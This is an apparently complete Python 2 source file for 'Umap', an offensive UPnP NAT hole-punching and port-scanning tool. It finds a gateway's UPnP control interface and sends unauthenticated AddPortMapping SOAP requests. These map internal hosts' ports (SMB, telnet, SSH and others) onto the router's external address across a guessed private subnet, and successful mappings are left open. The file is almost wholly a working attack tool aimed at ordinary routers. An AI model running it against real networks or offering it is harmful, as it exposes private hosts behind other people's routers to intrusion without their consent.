#!/usr/bin/python
#
# Umap v0.1beta (UPNP Map) 
# formatez@toor.do (Daniel Garcia)
# http://www.toor.do/
#
# UPNP NAT Hole puncher/Scanner
# --------------------------------
# This program attempts to scan open TCP ports on the hosts behind a UPNP enabled Internet Gateway Device(IGD) NAT.
# Today it is common to find open SOAP controls on gateway devices like DSL modems or common gateways. These open
# controls allow access to a group of actions of which the most common is the AddPortMapping action.
#
# This program sends SOAP requests to map ports and then attempts to connect to the mapped ports discovering hosts and services
# behind the devices's NAT.
#
# For more information on the subject:
# http://www.upnp-hacks.org/
# http://www.gnucitizen.org/
# http://www.sourcesec.com/2008/11/07/miranda-upnp-administration-tool/
#


import sys
import os
import socket
import urllib2
import getopt
import xml.dom.minidom as minidom
import threading
import Queue
import random
import time
from SOAPpy import *

# The format for the XML descriptor locations is 'XML location | TCP Port | Type'
knownLocations = ['/upnp/IGD.xml|80|0', '/allxml/|5431|1', '/devicedesc.xml|80|2', '/IGatewayDeviceDescDoc|2869|3', '/igd.xml|80|4', '/gatedesc.xml|49152|5', '/rootDesc.xml|5000|6']

# Default scanned ports
commonPorts = ['21','22','23','80','137','138','139','443','445','8080']


class Uscan(threading.Thread):
    def __init__(self, uip, ip, soapInfo, port, queue, verbose, portList):
        threading.Thread.__init__ (self)
        self.stopIt = threading.Event()
        self.portList = portList
        self.verbose = verbose
        self.ip = ip
        self.uip = uip
        self.soapInfo = soapInfo
        self.port = port
        self.queue = queue


    def run(self):


        for port in self.portList:
            if self.stopIt.isSet():
                print "Exiting"
                break
                sys.exit()
            open = False
            thisport = random.randint(30000, 40000)
            if self.verbose: print "[*] Trying port %s on %s" % (port, self.ip)
            endpoint = "http://%s:%s%s" % (self.uip, self.port, self.soapInfo[2])
            namespace = self.soapInfo[0]
            soapaction = namespace+'#AddPortMapping'
            server = SOAPProxy(endpoint, namespace)

            try:
                server._sa(soapaction).AddPortMapping(NewRemoteHost="",
                NewExternalPort=thisport,
                NewProtocol="TCP",
                NewInternalPort=port,
                NewInternalClient=self.ip,
                NewEnabled=1,
                NewPortMappingDescription=thisport,
                NewLeaseDuration=0)
            except Exception, err:
                print "[E]Couldn't add port %s with %s" % (thisport, port)
                if self.verbose: print err

            socket.setdefaulttimeout(6)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self.uip, thisport))
                open = 1
                print "Mapped: %s:%s<->%s:%s" % (self.uip, thisport, self.ip, port)
                print "Found open port %s and mapped to %s on ip %s through %s" % (port, thisport, self.ip, self.uip)
                s.close()
            except:
                s.close()
                if self.verbose: print "Closed port(%s)" % thisport

            if not open:
                endpoint = "http://%s:%s%s" % (self.uip, self.port, self.soapInfo[2])
                namespace = self.soapInfo[0]
                soapaction = namespace+"#DeletePortMapping"
                server = SOAPProxy(endpoint, namespace)
                try:
                    server._sa(soapaction).DeletePortMapping(NewRemoteHost="",
                    NewExternalPort=thisport,
                    NewProtocol="TCP")
                except Exception, err:
                    print "[E] Error deleting port %s", thisport
                    if self.verbose: print err

def main():
    max_threads = 16
    queue = Queue.Queue()
    upnp_type = False
    verbose = False
    portLow = 0
    portHigh = 0
    ip = ''
    socket.setdefaulttimeout(15)
    portList = []
    headers = {
            'USER-AGENT':'Umap/0.1',
            'CONTENT-TYPE':'text/xml; charset="utf-8"'
    }

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hcvt:i:p:", ["help", "verbose", "threads=", "ip=", "port="])
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(2)

    if len(opts) == 0:
        print "No arguments specified"
        printhelp()
        sys.exit(2)

    for o,a in opts:
        if o == "-h":
            printhelp()
            sys.exit(2)
        if o == "-v":
            verbose = 1
        if o == "-i":
            ip = a
        if o == "-p":
            if ',' in a:
                for port in a.split(','):
                    if port.isdigit():
                        portList.append(port)
                else:
                    print "[E] Wrong port number"
            elif '-' in a:
                (portLow, portHigh) = a.split('-')
                if portLow.isdigit() and portHigh.isdigit():
                    portLow = int(portLow)
                    portHigh = int(portHigh)
                    while portLow <= portHigh:
                        portList.append(portLow)
                        portLow += 1
            else:
                if a.isdigit:
                    portList.append(a)
                else:
                    print "[E] Wrong port number"
                    sys.exit()


        if o == "-t":
            if a.isdigit() and int(a) < 255:
                max_threads = a
            else:
                print "Error in threads"
                sys.exit()


    if len(portList) == 0:
        for port in commonPorts:
            portList.append(port)

    if not ip:
        print "[E] Target IP not specified"
        sys.exit()

    print "[*] Finding vectors"

    for location in knownLocations:
        data = False

        (link, port, upnpType) = location.split('|')
        requestLocation = "http://%s:%s%s" % (ip, port, link)
        try:
            print "[*] Trying ", requestLocation
            request = urllib2.Request(requestLocation, None)
            response = urllib2.urlopen(request)
            headers = response.info()
            data = response.read()
        except Exception, err:
            print "[E] Failed ", requestLocation

        if data:
            upnp_type = location
            print "[*] Positive match ", requestLocation
            soapInfo = getInfo(data, location, ip)
            if not soapInfo:
                print "[E] Couldn't find appropiate control"
                sys.exit()
            break


    base = soapInfo[3]
    if base == '':
        base = '10.0.0.1'
    ipGuess = base.split('://')[1].split(':')[0]

    if ipGuess == ip:
        ipGuess = '10.0.0.1'

    (a,b,c,d) = ipGuess.split('.')

    d = int(d)
    originald = d
    d = 1

    while d < 255:
        if d == originald:
            d += 1
            continue
        d += 1
        ipGuess = a+'.'+b+'.'+c+'.'+str(d)
        queue.put(ipGuess)

    if upnp_type == False:
        print "[E] Couldn't find a match"
        sys.exit()


    try:

        while True:
            if(threading.activeCount() < max_threads):
                current_ip = queue.get()
                umap = Uscan(ip, current_ip, soapInfo, port, queue, verbose, portList)
                umap.setDaemon(True)
                if umap.stopIt.isSet():
                    break
                umap.start()

    except KeyboardInterrupt:
        print "Caught interrupt! waiting for threads and exiting"
        umap.stopIt.set()
        umap.join()



def getInfo(xmlData, upnpType, ip):
    headers = {
               'USER-AGENT':'Umap/1.0',
               'CONTENT-TYPE':'text/xml; charset="utf-8"'
    }

    (link, port, upnpType) = upnpType.split('|')
    out = {}
    newXml = ''
    location = ''
    data = ''
    base = ''
    tags = ['URLBase', 'friendlyName', 'modelDescription', 'modelName', 'modelNumber', 'serialNumber', 'UDN']
    if upnpType == '1':
        on = 0
        for line in xmlData.split('\n'):
            if '<?xml ' in line or on == 1:
                on = 1
                newXml += line+'\n'

            if '</root' in line:
                on = 0
                break

        xmlRoot = minidom.parseString(newXml)

    else:
        xmlRoot = minidom.parseString(xmlData)




    for service in xmlRoot.getElementsByTagName('service'):
        try:
            serviceType = service.getElementsByTagName('serviceType')[0].childNodes[0].data
            wanXml = service.getElementsByTagName('SCPDURL')[0].childNodes[0].data
            controlURL = service.getElementsByTagName('controlURL')[0].childNodes[0].data
        except Exception, err:
            print "[E] Error getching main tags"
            return False
        if 'WANPPP' in serviceType:
            for tag in tags:
                try:
                    out[tag] = xmlRoot.getElementsByTagName(tag)[0].childNodes[0].data
                except:
                    pass
            print "[*] Device Information:\n"
            if 'URLBase' in out:
                base = out['URLBase']
            for name, value in out.iteritems():
                print "%s: %s" % (name, value)
            print "serviceType: %s\nwanXml: %s\ncontrolURL: %s\n" % (serviceType, wanXml, controlURL)
            return (serviceType, wanXml, controlURL, base)
    else:
        return False







def printhelp():
    print "------------"
    print "Umap v0.1beta"
    print "By FormateZ"
    print "formatez@toor.do"
    print "------------"
    print "-h: Help"
    print "-v: Verbose output"
    print "-p: Port / Port range"
    print "-i: Target IP"
    print "-t: Number of maximum threads"

if __name__ == '__main__':
    main()

